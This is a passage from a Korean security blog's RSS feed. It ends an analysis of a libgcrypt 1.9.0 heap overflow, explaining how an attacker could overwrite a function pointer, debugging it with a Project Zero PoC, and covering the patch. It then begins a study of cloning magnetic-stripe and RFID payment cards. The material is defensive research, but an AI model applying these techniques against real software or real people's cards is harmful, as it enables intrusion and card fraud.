+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;_gcry_md_block_write에서는 &lt;code class=&quot;highlighter-rouge&quot;&gt;hd-&amp;gt;count&lt;/code&gt;값이 &lt;code class=&quot;highlighter-rouge&quot;&gt;blocksize&lt;/code&gt;를 넘을수 없다고 가정했지만, libgcrypt의 sha1 코드를 보면, sha1_final을 통해 count값을 blocksize를 넘게끔 설정하는 부분을 찾아볼 수 있습니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// libgcrypt/cipher/sha1.c&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;545&lt;/span&gt;		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* need one extra block */&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;546&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;547&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* pad character */&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;548&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* fill pad and next block with zeroes */&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;549&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;550&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;여기서 &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt;값은 120으로 설정됩니다.  hd 구조체는 다음과 같으므로, count값과 copylen이 클수록 오버플로우가 날 확률도 높아집니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/* SHA1 needs 2x64 bytes and SHA-512 needs 128 bytes. */&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define MD_BLOCK_CTX_BUFFER_SIZE 128
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gcry_md_block_ctx&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MD_BLOCK_CTX_BUFFER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;MD_NBLOCKS_TYPE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nblocks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;MD_NBLOCKS_TYPE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nblocks_high&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blocksize_shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;_gcry_md_block_write_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gcry_md_block_ctx_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;이제 sha1_final 이후, &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt;값이 120으로 설정되고 _gcry_md_block_write를 호출하게 될 경우, blocksize는 여전히 64이기 때문에 &lt;code class=&quot;highlighter-rouge&quot;&gt;blocksize - hd-&amp;gt;count&lt;/code&gt;는 언더플로우로 copylen을 설정하는 if문을 들어가지 않게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;그렇다면 &lt;code class=&quot;highlighter-rouge&quot;&gt;buf_cpy&lt;/code&gt;는 전체입력을 버퍼에 복사하게 되고, count값이 120이므로, copylen이 8이상이라면 힙 오버플로우가 발생합니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;155&lt;/span&gt;	  &lt;span class=&quot;nf&quot;&gt;buf_cpy&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copylen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;또한 오버플로우된 버퍼에서 조금 떨어진 곳에 있는 bwrite는 함수 포인터로, _gcry_md_block_write에서 버퍼 복사를 수행한 후 &lt;code class=&quot;highlighter-rouge&quot;&gt;hd-&amp;gt;bwrite(hd, inbuf, inblocks)&lt;/code&gt;를 호출합니다. 때문에 공격자가 오버플로우를 통해 &lt;code class=&quot;highlighter-rouge&quot;&gt;bwrite&lt;/code&gt;를 덮어 프로그램 흐름을 쉽게 컨트롤할 수 있습니다.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// libgcrypt/cipher/hash-common.c&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;166&lt;/span&gt;		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blocksize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;167&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;168&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;inblocks&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blocksize_shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;169&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;nburn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bwrite&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inblocks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;이제 &lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/attachment?aid=486952&amp;amp;signed_aid=hXelt91sJk0bhikNO2DOBA==&quot;&gt;PoC파일&lt;/a&gt; 실행 결과, 재현된 취약점을 gdb를 통해 살펴보도록하겠습니다.&lt;/p&gt;
+
+&lt;p&gt;gpg에 pwndbg를 붙여 &lt;code class=&quot;highlighter-rouge&quot;&gt;hash-common.c+150&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;sha1.c+550&lt;/code&gt;에 중단점을 설정하였습니다.&lt;/p&gt;
+
+&lt;p&gt;먼저 아래 부분에서 sha1.c의 550행에 접근하여 &lt;code class=&quot;highlighter-rouge&quot;&gt;hd-&amp;gt;bctx.count = 64 + 56&lt;/code&gt;을 실행하여 count값이 120이 된 것을 확인할 수 있었습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/jae_2.png&quot; alt=&quot;/assets/202103/jae_2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;다음으로 &lt;code class=&quot;highlighter-rouge&quot;&gt;hash-common.c+150&lt;/code&gt;에 중단점이 걸렸을 때, &lt;code class=&quot;highlighter-rouge&quot;&gt;copylen&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;blocksize&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;hd-&amp;gt;count&lt;/code&gt;의 값입니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/jae_3.png&quot; alt=&quot;/assets/202103/jae_3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;언더플로우로 인해 copylen은 재설정되지않고, 그대로 buf_cpy를 실행하여 복사가 수행되게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/jae_4.png&quot; alt=&quot;/assets/202103/jae_4.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/jae_5.png&quot; alt=&quot;/assets/202103/jae_5.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;이후 다음번 _gcry_md_block_write 호출에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;hd-&amp;gt;bwrite&lt;/code&gt;함수를 호출되게 됩니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;패치&quot;&gt;패치&lt;/h2&gt;
+
+&lt;p&gt;hash-common.c의  _gcry_md_block_write에 다음 코드가 추가되었습니다. &lt;code class=&quot;highlighter-rouge&quot;&gt;hd-&amp;gt;count&lt;/code&gt;의 값이 &lt;code class=&quot;highlighter-rouge&quot;&gt;blocksize&lt;/code&gt;를 넘지 못하게하여 위와 같은 취약점이 발생하는 것을 방어하였습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/jae_6.png&quot; alt=&quot;/assets/202103/jae_6.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;결론&quot;&gt;결론&lt;/h2&gt;
+
+&lt;p&gt;이 취약점은 트리거를 위해 어떠한 인증(verification)이나 서명(signature)도 필요하지 않기 때문에 심각한 취약점으로 받아들여졌습니다. 현재 익스플로잇을 위한 암호 데이터 블럭의 구성 방법은 90일의 공개 마감(2021-01-29 기준)에 따르기 때문에 그 내용이 알려지지는 않았습니다. 하지만 취약점 자체가 간단하기 때문에 공개된 분석 내용과 PoC 파일을 이용한다면 쉽게 악용할 수 있을 것으로 보입니다. 때문에 영향을 받는 버전인 libgcrypt 1.9.0을 사용하고 있다면 빠른 패치를 해야할 것입니다.&lt;/p&gt;
+&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2145&quot;&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=2145&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/gpg/libgcrypt/blob/f9d8b5a0369cc94e125d36d9c8864d5cd2eaa1d2/cipher/sha1.c#L550&quot;&gt;https://github.com/gpg/libgcrypt/blob/f9d8b5a0369cc94e125d36d9c8864d5cd2eaa1d2/cipher/sha1.c#L550&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/gpg/libgcrypt/blob/f9d8b5a0369cc94e125d36d9c8864d5cd2eaa1d2/cipher/sha1.c#L550&quot;&gt;https://github.com/gpg/libgcrypt/blob/f9d8b5a0369cc94e125d36d9c8864d5cd2eaa1d2/cipher/sha1.c#L550&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/vt0r/a2f8c0bcb1400131ff51&quot;&gt;https://gist.github.com/vt0r/a2f8c0bcb1400131ff51&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://lists.gnupg.org/pipermail/gnupg-announce/2021q1/000456.html&quot;&gt;https://lists.gnupg.org/pipermail/gnupg-announce/2021q1/000456.html&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/vt0r/a2f8c0bcb1400131ff51&quot;&gt;https://gist.github.com/vt0r/a2f8c0bcb1400131ff51&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://ko.wikipedia.org/wiki/GNU_%ED%94%84%EB%9D%BC%EC%9D%B4%EB%B2%84%EC%8B%9C_%EA%B0%80%EB%93%9C&quot;&gt;https://ko.wikipedia.org/wiki/GNU_프라이버시_가드&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Libgcrypt&quot;&gt;https://en.wikipedia.org/wiki/Libgcrypt&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Mon, 08 Mar 2021 00:00:00 +0000</pubDate>
+        <link>http://202.182.127.225:4000/2021-03-08/GPG-Heap-BOF</link>
+        <guid isPermaLink="true">http://202.182.127.225:4000/2021-03-08/GPG-Heap-BOF</guid>
+        
+        <category>Heap</category>
+        
+        <category>Analysis</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>카드 결제 방식 분석 및 복사 연구(Magnetic, RFID, IC)</title>
+        <description>&lt;p&gt;라온화이트햇 핵심연구팀 황정식&lt;/p&gt;
+
+&lt;p&gt;우리가 일상에서 사용하는 카드 결제 방식은 대략 세 가지 정도가 있습니다. 예전부터 사용했던 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;마그네틱 카드(Magnetic Card)&lt;/code&gt;&lt;/strong&gt;가 카드 결제에 대표적인 예시입니다. 그러나 카드 복사와 다른 보안성 문제로 인해 다른 대체제가 필요로 하게 되었습니다. 이로 마그네틱 카드의 대체제로써 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RFID Tag&lt;/code&gt;&lt;/strong&gt;, &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IC Chip&lt;/code&gt;&lt;/strong&gt; 등이 있으며, 현재 직불카드(체크카드와 신용카드 등)에 부착하여 널리 사용되고 있습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/sik_.png&quot; alt=&quot;/assets/202103/sik_.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;이번 연구에서는 위의 세 가지 카드 결제 방식에 대해 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;복사&lt;/code&gt;&lt;/strong&gt;가 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;가능여부&lt;/code&gt;&lt;/strong&gt;에 대한 연구와, &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;보안성&lt;/code&gt;&lt;/strong&gt;에 대한 내용을 다뤄보겠습니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;1-마그네틱-카드&quot;&gt;1. 마그네틱 카드&lt;/h2&gt;
+
+&lt;p&gt;마그네틱 카드는 신용카드의 도입에 큰 역할을 한 기술이라고 볼 수 있습니다. 기존의 신용카드(Credit card)는 종이 재질의 카드로써 배포되었었습니다. 하지만 이러한 종이 재질의 카드로써는 불편함과 신용인에 대한 확인에서부터 많은 시간이 소요되는 단점이 있었습니다. 이를 개선하기 위해 등장한 기술이 마그네틱 기술입니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/sik_1.png&quot; alt=&quot;/assets/202103/sik_1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;마그네틱 카드는 전류를 통해 마그네틱 띠가 자화되는 원리를 이용하여 정보를 기록하고, 이와 반대 방향으로 자기 방향을 변화하면 유도전류를 흘려 마그네틱 띠 내부의 정보를 읽을 수 있도록 하는 구조입니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/sik_2.png&quot; alt=&quot;/assets/202103/sik_2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;마그네틱 카드의 구조는 대략적으로 이렇게 구성되어 있습니다. 이 부분에서 눈여겨 봐야 할 부분은 Track 1과 Track 2의 부분입니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/sik_3.png&quot; alt=&quot;/assets/202103/sik_3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Track 1과 Track 2에는 공통적으로 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;고객번호(Primary Account Number) 19자&lt;/code&gt;&lt;/strong&gt;와 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ED(Expiration Data or Date)&lt;/code&gt;&lt;/strong&gt;와 같은 만료날짜, &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SC(Service Code)&lt;/code&gt;&lt;/strong&gt; 서비스 코드, 그리고 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CVV/CVC(Discretionary Data)&lt;/code&gt;&lt;/strong&gt;가 기록되어 있습니다. Track 1에는 Track 2에 비해 이름 등과 같은 이용자의 정보가 좀 더 들어가 있습니다.&lt;/p&gt;
+
+&lt;p&gt;이러한 카드정보를 어떻게 알아낼 수 있는지, 그리고 카드 복사는 어떻게 이루어지는지에 대해 연구해본 내용은 다음과 같습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;※ 본 연구는 오로지 직불카드 내의 마그네틱 정보의 취약성을 연구하기 위해 연구자 본인의 카드 정보를 읽는 과정을 나타내었습니다.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;마그네틱 카드 정보 읽기/쓰기&lt;/strong&gt;&lt;/p&gt;
+
+    &lt;p&gt;마그네틱 카드는 해외에서 거래되는 Magnetic Card Reader, Writer를 통해 가능합니다. 이러한 카드 리더기는 Amazon 혹은 Ali Express와 같은 해외 직구 사이트를 통해 구입이 가능했습니다.&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_4.png&quot; alt=&quot;/assets/202103/sik_4.png&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;카드 리더기를 통해 읽어들이게 되면, 다음과 같이 세 개의 Track 정보를 보여주게 됩니다. 제 개인정보 보호를 위해 일부 모자이크 처리를 수행하였습니다. 마그네틱 카드는 시중에서 쉽게 구매가 가능하며, 읽고 쓰는 것이 얼마든지 자유로운 것으로 확인되었습니다.&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_5.png&quot; alt=&quot;/assets/202103/sik_5.png&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;마그네틱 카드 보안성 정리&lt;/p&gt;
+    &lt;ol&gt;
+      &lt;li&gt;카드 자체 보안성(취약) - 쉽게 탈취 가능&lt;/li&gt;
+      &lt;li&gt;카드 복사 가능성(취약) - 쉽게 가능&lt;/li&gt;
+      &lt;li&gt;피해 발생 가능성(취약) - 높음&lt;/li&gt;
+    &lt;/ol&gt;
+
+    &lt;p&gt;마그네틱 카드는 현재까지도 지방과 수도권 할 것 없이, 많은 곳에서 결재를 지원하고 있습니다. 현재까지도 RFID 방식과 IC Chip 카드를 통한 결재를 권고하고 있지만, 결재 시스템 전체를 바꾸지 못하는 현 상황에서는 피해 발생 가능성이 낮지 않다는 것을 알 수 있습니다. 또한 마그네틱 카드는 카드 자체로써 정보를 얻는 것이 쉽고, 카드 정보가 노출된 것만으로 복사가 쉽게 이루어질 수 있음이 확인되었습니다. 따라서 보안성이 매우 취약한 마그네틱 카드의 결재 방식을 RFID 혹은 NFC, IC Chip로 대체하여 결재가 될 수 있도록 권고하고 있습니다.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;2-rfid-tag&quot;&gt;2. RFID Tag&lt;/h2&gt;
+
+&lt;p&gt;RFID란 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Radio Frequency IDentification&lt;/code&gt;&lt;/strong&gt;의 약자로, 무선 주파수(Radio Frequency)를 이용하여 특정 대상을 식별할 수 있는 기술을 말합니다. RFID Tag를 통한 식별(결재, 인증 등) 과정은 다음과 같이 나타낼 수 있습니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;RFID Tag 식별 과정(요약)&lt;/strong&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_6.png&quot; alt=&quot;/assets/202103/sik_6.png&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;흔히 버스카드 리더기, 결제창구, 도어락 등에서 위와 같은 Antenna라고 하여 RFID Tag를 읽는 기능을 내장하고 있습니다. 이러한 Antenna에서는 일정량의 유도전류를 상시 발생시키고 있습니다. 그리고 이런 안테나에 RFID Tag를 가져다 대면 RFID Tag는 전류를 받아 특정 데이터를 응답하도록 되어 있습니다. 이에 대한 흐름과 순서는 다음과 같습니다.&lt;/p&gt;
+
+    &lt;ol&gt;
+      &lt;li&gt;RFID Tag를 Antenna에 가까이 가져가면, Antenna는 RFID Tag에 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Tag 데이터를 요청함&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
+      &lt;li&gt;RFID Tag는 내장되어 있는 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Tag ID(Metal ID)를 전송&lt;/code&gt;&lt;/strong&gt;하게 되는데, 이때 Metal ID는 일종의 UID로써 공장에서 제작될 때 나오는 유니크한 정보임&lt;/li&gt;
+      &lt;li&gt;Antenna는 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;(가칭)Key Management Server&lt;/code&gt;&lt;/strong&gt;를 통해 현재 Endpoint에서 들어온 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Metal ID와 매칭되는 Key 값&lt;/code&gt;&lt;/strong&gt;을 Antenna에 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;전달&lt;/code&gt;&lt;/strong&gt;함&lt;/li&gt;
+      &lt;li&gt;Antenna는 Metal ID에 해당하는 Key 값을 전송하여 RFID Tag에 전송함&lt;/li&gt;
+      &lt;li&gt;RFID &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Tag 내에 저장된 Key 값과 동일&lt;/code&gt;&lt;/strong&gt;한 값이 Antenna로부터 받아들여질 경우, &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Tag 내의 유저 ID&lt;/code&gt;&lt;/strong&gt;(시스템에서 식별할 수 있는 특정)값을 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;전송&lt;/code&gt;&lt;/strong&gt;함&lt;/li&gt;
+      &lt;li&gt;Antenna는 ID 값을 확인하고 원하는 행위를 서버와 함께 수행함&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;RFID Tag의 구조&lt;/strong&gt;&lt;/p&gt;
+
+    &lt;p&gt;RFID는 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;16개의 Sector&lt;/code&gt;&lt;/strong&gt;와 각 하나의 Sector 별로 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;4개의 Block&lt;/code&gt;&lt;/strong&gt;이 존재합니다. 이렇게 해서 총 64개의 블록이 존재하게 되는데, 그 구조는 다음과 같습니다.&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_7.png&quot; alt=&quot;/assets/202103/sik_7.png&quot; /&gt;&lt;/p&gt;
+
